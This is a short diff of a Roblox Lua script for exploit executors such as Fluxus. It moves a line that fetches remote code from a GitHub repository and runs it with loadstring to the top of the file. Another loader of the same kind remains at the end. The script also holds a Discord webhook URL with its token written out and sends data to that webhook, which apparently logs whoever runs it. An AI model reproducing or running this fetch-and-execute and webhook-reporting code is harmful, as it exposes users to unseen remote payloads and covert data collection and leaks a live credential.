@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Nevan32/Nevan/refs/heads/main/info%20executed%20server"))()
+
 local http_request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request) -- Adaptasi buat Fluxus dan executor lain
 local webhookURL = "https://discord.com/api/webhooks/1259248213098102867/UqGdOpdNYXF0XS-8pVsAxb9thF7FLwe-9_6z8AfJ46t5ZjOneCTQyNfs5wB9YYShGnDj"
 
@@ -36,5 +38,3 @@ http_request({
 })
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Nevan32/Nevan/main/NevanHubK"))()
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Nevan32/Nevan/refs/heads/main/info%20executed%20server"))()
